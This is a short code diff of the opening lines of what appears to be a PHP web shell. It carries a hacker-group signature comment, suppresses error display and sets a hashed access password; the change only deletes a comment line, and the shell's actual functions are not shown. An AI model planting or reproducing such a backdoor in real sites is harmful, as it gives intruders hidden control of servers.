@@ -1,7 +1,6 @@
 <?php 
 # Stupidc0de Family!
 # Fuck the world
-# Wassalam
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 $auth_pass="102a6ed6587b5b8cb4ebbe972864690b";
